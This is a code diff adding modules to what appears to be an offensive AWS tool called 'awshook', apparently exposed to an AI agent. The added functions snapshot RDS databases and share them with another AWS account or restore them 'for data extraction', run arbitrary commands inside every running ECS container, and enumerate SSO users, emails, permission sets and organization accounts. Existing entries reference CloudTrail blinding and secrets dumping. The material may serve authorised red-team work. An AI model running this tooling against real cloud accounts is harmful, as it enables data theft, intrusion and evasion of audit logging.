@@ -47,6 +47,26 @@ const PROGRAMS = {
       "Create EBS volume snapshots for data exfiltration, optionally share cross-account for offline analysis",
     args: "--volume-id VOL_ID [--share-account ACCOUNT_ID] [--profile PROFILE]",
   },
+  rds_dump: {
+    description:
+      "Create RDS snapshot, optionally share cross-account or restore to accessible instance for data extraction",
+    args: "--db-identifier ID [--share-account ACCOUNT_ID] [--restore] [--profile PROFILE] [--region REGION]",
+  },
+  ecs_exec: {
+    description:
+      "Execute commands inside running ECS Fargate/EC2 containers via ECS Exec (SSM-based) — no SSH or direct network access required",
+    args: "--cluster CLUSTER --task TASK --container CONTAINER --command CMD [--all-tasks] [--profile PROFILE] [--region REGION]",
+  },
+  sso_enum: {
+    description:
+      "Enumerate AWS SSO/IAM Identity Center: instances, permission sets, account assignments, and identity store users/groups",
+    args: "[--instance-arn ARN] [--profile PROFILE] [--region REGION]",
+  },
+  org_enum: {
+    description:
+      "Enumerate AWS Organizations: accounts, OUs, SCPs, delegated administrators, and cross-account trust relationships",
+    args: "[--profile PROFILE] [--region REGION]",
+  },
   cleanup_aws: {
     description:
       "Remove all CyberStrike-created AWS resources, restore CloudTrail logging, clean state files. ALWAYS run before leaving",
@@ -502,6 +522,297 @@ async function ec2Snapshot(args: string[], timeout: number): Promise<HookResult>
   return { output: output.join("\n"), findings: [] }
 }
 
+async function rdsDump(args: string[], timeout: number): Promise<HookResult> {
+  const dbId = argVal(args, "--db-identifier")
+  const shareAccount = argVal(args, "--share-account")
+  const restore = hasFlag(args, "--restore")
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const findings: Finding[] = []
+
+  if (!dbId) {
+    const r = await aws(["rds", "describe-db-instances", "--query", "DBInstances[].[DBInstanceIdentifier,Engine,DBInstanceStatus,Endpoint.Address]"], profile, region, timeout)
+    if (r.exitCode !== 0) return { output: `[-] Cannot list RDS instances: ${r.stderr.trim()}`, findings }
+    const dbs = tryJson(r.stdout) || []
+    const output = [`[*] RDS Instances: ${dbs.length}\n`]
+    for (const db of dbs) output.push(`    ${db[0]} (${db[1]}) — ${db[2]} — ${db[3] || "no endpoint"}`)
+    output.push("\n[*] Use --db-identifier to create a snapshot")
+    return { output: output.join("\n"), findings }
+  }
+
+  const output = [`[*] RDS Snapshot — target: ${dbId}\n`]
+  const snapId = `cs-snap-${Date.now()}`
+  const r = await aws(["rds", "create-db-snapshot", "--db-instance-identifier", dbId, "--db-snapshot-identifier", snapId, "--tags", "Key=CreatedBy,Value=CyberStrike"], profile, region, timeout)
+  if (r.exitCode !== 0) return { output: `[-] Snapshot failed: ${r.stderr.trim()}`, findings }
+
+  output.push(`[+] Snapshot created: ${snapId}`)
+  output.push(`[*] Waiting for snapshot to become available...`)
+
+  const wait = await aws(["rds", "wait", "db-snapshot-available", "--db-snapshot-identifier", snapId], profile, region, timeout)
+  if (wait.exitCode === 0) output.push(`[+] Snapshot available`)
+
+  findings.push({
+    checkId: "AWS-RDS-001", provider: "aws", severity: "critical", status: "EXTRACTED",
+    resource: `rds:${dbId}`, title: `RDS snapshot created: ${snapId}`,
+    details: `Snapshot of ${dbId} created for data extraction`,
+    remediation: "Delete snapshot after engagement: aws rds delete-db-snapshot",
+  })
+
+  if (shareAccount) {
+    const sr = await aws(["rds", "modify-db-snapshot-attribute", "--db-snapshot-identifier", snapId, "--attribute-name", "restore", "--values-to-add", shareAccount], profile, region, timeout)
+    if (sr.exitCode === 0) {
+      output.push(`[+] Snapshot shared with account: ${shareAccount}`)
+      findings.push({
+        checkId: "AWS-RDS-002", provider: "aws", severity: "critical", status: "SHARED",
+        resource: `rds:${snapId}`, title: `RDS snapshot shared cross-account: ${shareAccount}`,
+        details: `Snapshot ${snapId} shared with AWS account ${shareAccount}`,
+        remediation: "Revoke sharing after extraction",
+      })
+    } else {
+      output.push(`[-] Sharing failed: ${sr.stderr.trim()}`)
+    }
+  }
+
+  if (restore) {
+    const restoreId = `cs-restore-${Date.now()}`
+    const rr = await aws(["rds", "restore-db-instance-from-db-snapshot", "--db-instance-identifier", restoreId, "--db-snapshot-identifier", snapId, "--db-instance-class", "db.t3.micro", "--tags", "Key=CreatedBy,Value=CyberStrike"], profile, region, timeout)
+    if (rr.exitCode === 0) {
+      output.push(`[+] Restoring snapshot to instance: ${restoreId}`)
+      output.push(`[*] Wait for instance, then connect and extract data`)
+    } else {
+      output.push(`[-] Restore failed: ${rr.stderr.trim()}`)
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function ecsExec(args: string[], timeout: number): Promise<HookResult> {
+  const cluster = argVal(args, "--cluster")
+  const task = argVal(args, "--task")
+  const container = argVal(args, "--container")
+  const command = argVal(args, "--command")
+  const allTasks = hasFlag(args, "--all-tasks")
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const findings: Finding[] = []
+
+  if (!cluster) return { output: "ERROR: --cluster required", findings }
+
+  if (!task && !allTasks) {
+    const r = await aws(["ecs", "list-clusters", "--query", "clusterArns"], profile, region, timeout)
+    if (r.exitCode === 0) {
+      const clusters = tryJson(r.stdout) || []
+      const output = [`[*] ECS Clusters: ${clusters.length}\n`]
+      for (const c of clusters) output.push(`    ${c}`)
+
+      const tasks = await aws(["ecs", "list-tasks", "--cluster", cluster, "--query", "taskArns"], profile, region, timeout)
+      if (tasks.exitCode === 0) {
+        const taskList = tryJson(tasks.stdout) || []
+        output.push(`\n[+] Tasks in ${cluster}: ${taskList.length}`)
+        if (taskList.length > 0) {
+          const desc = await aws(["ecs", "describe-tasks", "--cluster", cluster, "--tasks", ...taskList.slice(0, 10), "--query", "tasks[].[taskArn,lastStatus,containers[].name]"], profile, region, timeout)
+          if (desc.exitCode === 0) {
+            const taskDetails = tryJson(desc.stdout) || []
+            for (const t of taskDetails) output.push(`    ${t[0].split("/").pop()} (${t[1]}) — containers: ${(t[2] || []).join(",")}`)
+          }
+        }
+      }
+      output.push("\n[*] Use --task TASK --container CONTAINER --command CMD to execute")
+      return { output: output.join("\n"), findings }
+    }
+    return { output: "[-] Cannot list clusters", findings }
+  }
+
+  if (!command) return { output: "ERROR: --command required for execution", findings }
+
+  const targetTasks = allTasks
+    ? await (async () => {
+        const r = await aws(["ecs", "list-tasks", "--cluster", cluster, "--query", "taskArns"], profile, region, timeout)
+        return r.exitCode === 0 ? (tryJson(r.stdout) || []).map((t: string) => t.split("/").pop()) : []
+      })()
+    : [task!]
+
+  const output = [`[*] ECS Exec — cluster: ${cluster}, targets: ${targetTasks.length}\n`]
+
+  for (const t of targetTasks) {
+    const execArgs = ["ecs", "execute-command", "--cluster", cluster, "--task", t, "--command", command]
+    if (container) execArgs.push("--container", container)
+    execArgs.push("--interactive")
+
+    const r = await aws(execArgs, profile, region, timeout)
+    if (r.exitCode === 0) {
+      output.push(`[+] Task ${t}:\n${r.stdout.trim()}`)
+      findings.push({
+        checkId: `AWS-ECS-${findings.length + 1}`, provider: "aws", severity: "high", status: "EXECUTED",
+        resource: `ecs:${cluster}/${t}`, title: `Command executed in ECS task: ${t}`,
+        details: `Command: ${command}, container: ${container || "default"}`,
+        remediation: "Review ECS Exec audit logs in CloudTrail",
+      })
+    } else {
+      output.push(`[-] Task ${t}: ${r.stderr.trim().split("\n")[0]}`)
+      if (r.stderr.includes("ExecuteCommandNotEnabled")) {
+        output.push(`    [*] ECS Exec not enabled. Enable: aws ecs update-service --cluster ${cluster} --service SVC --enable-execute-command`)
+      }
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function ssoEnum(args: string[], timeout: number): Promise<HookResult> {
+  const instanceArn = argVal(args, "--instance-arn")
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] AWS SSO / IAM Identity Center Enumeration\n"]
+
+  const instances = await aws(["sso-admin", "list-instances"], profile, region, timeout)
+  if (instances.exitCode !== 0) return { output: `[-] Cannot list SSO instances: ${instances.stderr.trim()}\n[*] SSO may not be configured or region may be wrong`, findings }
+
+  const instanceList = tryJson(instances.stdout)?.Instances || []
+  output.push(`[+] SSO Instances: ${instanceList.length}`)
+
+  const targetArn = instanceArn || instanceList[0]?.InstanceArn
+  const identityStoreId = instanceList[0]?.IdentityStoreId
+  if (!targetArn) return { output: output.join("\n") + "\n[-] No SSO instance found", findings }
+
+  output.push(`[*] Using instance: ${targetArn}`)
+  output.push(`[*] Identity Store: ${identityStoreId}\n`)
+
+  const permSets = await aws(["sso-admin", "list-permission-sets", "--instance-arn", targetArn], profile, region, timeout)
+  if (permSets.exitCode === 0) {
+    const psArns = tryJson(permSets.stdout)?.PermissionSets || []
+    output.push(`[+] Permission Sets: ${psArns.length}`)
+    for (const psArn of psArns) {
+      const desc = await aws(["sso-admin", "describe-permission-set", "--instance-arn", targetArn, "--permission-set-arn", psArn], profile, region, timeout)
+      if (desc.exitCode === 0) {
+        const ps = tryJson(desc.stdout)?.PermissionSet || {}
+        output.push(`    ${ps.Name} — session: ${ps.SessionDuration || "default"} — ${psArn}`)
+        if (ps.Name === "AdministratorAccess" || ps.Name === "PowerUserAccess") {
+          findings.push({
+            checkId: `AWS-SSO-${findings.length + 1}`, provider: "aws", severity: "high", status: "FOUND",
+            resource: psArn, title: `High-privilege permission set: ${ps.Name}`,
+            details: `SSO permission set ${ps.Name} grants broad access`,
+            remediation: "Review who is assigned this permission set",
+          })
+        }
+      }
+    }
+  }
+
+  if (identityStoreId) {
+    const users = await aws(["identitystore", "list-users", "--identity-store-id", identityStoreId], profile, region, timeout)
+    if (users.exitCode === 0) {
+      const userList = tryJson(users.stdout)?.Users || []
+      output.push(`\n[+] Identity Store Users: ${userList.length}`)
+      for (const u of userList.slice(0, 30)) {
+        output.push(`    ${u.UserName || u.UserId} — ${u.DisplayName || ""} — ${u.Emails?.[0]?.Value || "no email"}`)
+      }
+    }
+
+    const groups = await aws(["identitystore", "list-groups", "--identity-store-id", identityStoreId], profile, region, timeout)
+    if (groups.exitCode === 0) {
+      const groupList = tryJson(groups.stdout)?.Groups || []
+      output.push(`\n[+] Identity Store Groups: ${groupList.length}`)
+      for (const g of groupList) output.push(`    ${g.DisplayName} — ${g.GroupId}`)
+    }
+  }
+
+  const accounts = await aws(["organizations", "list-accounts", "--query", "Accounts[].[Id,Name,Status]"], profile, region, timeout)
+  if (accounts.exitCode === 0) {
+    const acctList = tryJson(accounts.stdout) || []
+    output.push(`\n[+] Organization Accounts: ${acctList.length}`)
+    for (const a of acctList.slice(0, 20)) output.push(`    ${a[0]} — ${a[1]} (${a[2]})`)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function orgEnum(args: string[], timeout: number): Promise<HookResult> {
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] AWS Organizations Enumeration\n"]
+
+  const org = await aws(["organizations", "describe-organization"], profile, region, timeout)
+  if (org.exitCode !== 0) return { output: `[-] Cannot describe organization: ${org.stderr.trim()}\n[*] This account may not be part of an Organization`, findings }
+
+  const orgInfo = tryJson(org.stdout)?.Organization || {}
+  output.push(`[+] Organization: ${orgInfo.Id}`)
+  output.push(`    Master Account: ${orgInfo.MasterAccountId} (${orgInfo.MasterAccountEmail})`)
+  output.push(`    Feature Set: ${orgInfo.FeatureSet}`)
+
+  const accounts = await aws(["organizations", "list-accounts"], profile, region, timeout)
+  if (accounts.exitCode === 0) {
+    const acctList = tryJson(accounts.stdout)?.Accounts || []
+    output.push(`\n[+] Accounts: ${acctList.length}`)
+    for (const a of acctList) {
+      output.push(`    ${a.Id} — ${a.Name} (${a.Status}) — ${a.Email}`)
+      if (a.Id === orgInfo.MasterAccountId) output.push(`      ^ MANAGEMENT ACCOUNT`)
+    }
+    findings.push({
+      checkId: "AWS-ORG-001", provider: "aws", severity: "info", status: "ENUMERATED",
+      resource: `org:${orgInfo.Id}`, title: `AWS Organization enumerated: ${acctList.length} accounts`,
+      details: `Management account: ${orgInfo.MasterAccountId}, feature set: ${orgInfo.FeatureSet}`,
+      remediation: "Review cross-account trust policies and SCPs",
+    })
+  }
+
+  const roots = await aws(["organizations", "list-roots"], profile, region, timeout)
+  if (roots.exitCode === 0) {
+    const rootList = tryJson(roots.stdout)?.Roots || []
+    for (const root of rootList) {
+      output.push(`\n[+] Root: ${root.Id} (${root.Name})`)
+      const enabledPolicies = (root.PolicyTypes || []).filter((p: Record<string, string>) => p.Status === "ENABLED")
+      output.push(`    Enabled policy types: ${enabledPolicies.map((p: Record<string, string>) => p.Type).join(", ") || "none"}`)
+
+      const ous = await aws(["organizations", "list-organizational-units-for-parent", "--parent-id", root.Id], profile, region, timeout)
+      if (ous.exitCode === 0) {
+        const ouList = tryJson(ous.stdout)?.OrganizationalUnits || []
+        output.push(`    OUs: ${ouList.length}`)
+        for (const ou of ouList) {
+          output.push(`      ${ou.Id} — ${ou.Name}`)
+          const childOus = await aws(["organizations", "list-organizational-units-for-parent", "--parent-id", ou.Id], profile, region, timeout)
+          if (childOus.exitCode === 0) {
+            const children = tryJson(childOus.stdout)?.OrganizationalUnits || []
+            for (const child of children) output.push(`        ${child.Id} — ${child.Name}`)
+          }
+        }
+      }
+    }
+  }
+
+  const scps = await aws(["organizations", "list-policies", "--filter", "SERVICE_CONTROL_POLICY"], profile, region, timeout)
+  if (scps.exitCode === 0) {
+    const scpList = tryJson(scps.stdout)?.Policies || []
+    output.push(`\n[+] Service Control Policies: ${scpList.length}`)
+    for (const scp of scpList) {
+      output.push(`    ${scp.Id} — ${scp.Name} (${scp.AwsManaged ? "AWS Managed" : "Custom"})`)
+      if (!scp.AwsManaged) {
+        const content = await aws(["organizations", "describe-policy", "--policy-id", scp.Id, "--query", "Policy.Content"], profile, region, timeout)
+        if (content.exitCode === 0) {
+          const doc = tryJson(tryJson(content.stdout) || "{}")
+          const statements = doc?.Statement || []
+          const denies = statements.filter((s: Record<string, string>) => s.Effect === "Deny")
+          output.push(`      Statements: ${statements.length} (${denies.length} deny)`)
+        }
+      }
+    }
+  }
+
+  const delegated = await aws(["organizations", "list-delegated-administrators"], profile, region, timeout)
+  if (delegated.exitCode === 0) {
+    const delList = tryJson(delegated.stdout)?.DelegatedAdministrators || []
+    if (delList.length > 0) {
+      output.push(`\n[+] Delegated Administrators: ${delList.length}`)
+      for (const d of delList) output.push(`    ${d.Id} — ${d.Name} — ${d.Email}`)
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 async function cleanupAws(args: string[], timeout: number): Promise<HookResult> {
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
@@ -518,6 +829,20 @@ async function cleanupAws(args: string[], timeout: number): Promise<HookResult> 
       else {
         await aws(["ec2", "delete-snapshot", "--snapshot-id", s], profile, region, timeout)
         output.push(`    Deleted: ${s}`)
+      }
+    }
+  }
+
+  const rdsSnaps = await aws(["rds", "describe-db-snapshots", "--query", "DBSnapshots[?contains(DBSnapshotIdentifier,'cs-snap-')].[DBSnapshotIdentifier]"], profile, region, timeout)
+  if (rdsSnaps.exitCode === 0) {
+    const rdsList = tryJson(rdsSnaps.stdout) || []
+    output.push(`[+] RDS snapshots to clean: ${rdsList.length}`)
+    for (const s of rdsList) {
+      const snapId = s[0]
+      if (dryRun) { output.push(`    Would delete: ${snapId}`) }
+      else {
+        await aws(["rds", "delete-db-snapshot", "--db-snapshot-identifier", snapId], profile, region, timeout)
+        output.push(`    Deleted: ${snapId}`)
       }
     }
   }
@@ -579,6 +904,10 @@ export const AwshookTool = Tool.define("awshook", {
       cloudtrail_blind: () => cloudtrailBlind(params.args, params.timeout_seconds),
       secrets_dump: () => secretsDump(params.args, params.timeout_seconds),
       ec2_snapshot: () => ec2Snapshot(params.args, params.timeout_seconds),
+      rds_dump: () => rdsDump(params.args, params.timeout_seconds),
+      ecs_exec: () => ecsExec(params.args, params.timeout_seconds),
+      sso_enum: () => ssoEnum(params.args, params.timeout_seconds),
+      org_enum: () => orgEnum(params.args, params.timeout_seconds),
       cleanup_aws: () => cleanupAws(params.args, params.timeout_seconds),
     }
 
